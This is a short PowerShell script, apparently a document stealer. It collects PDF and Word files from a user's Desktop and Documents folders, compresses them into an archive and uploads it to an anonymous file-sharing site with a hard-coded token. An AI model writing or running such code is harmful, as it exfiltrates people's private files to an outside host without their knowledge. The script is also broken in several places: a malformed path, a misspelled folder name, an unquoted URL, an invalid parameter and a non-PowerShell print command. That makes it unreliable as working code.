$datapath1 = "%User\Desktop\Grap.zip"
$input1 = "%User%\Desktop\*.pdf,*.docx"
$input2 = "%User%\Dokuments\*.pdf,*.docx"
Compress-Archive $input1 $datapath1
Compress-Archive $input2 -update $datapath1

$url = https://api.anonfiles.com/upload?token=6e578f0f3525bf07

$r = Invoke-WebRequest -url $url -Method Put -Infile $datapath1

print "$r.Content"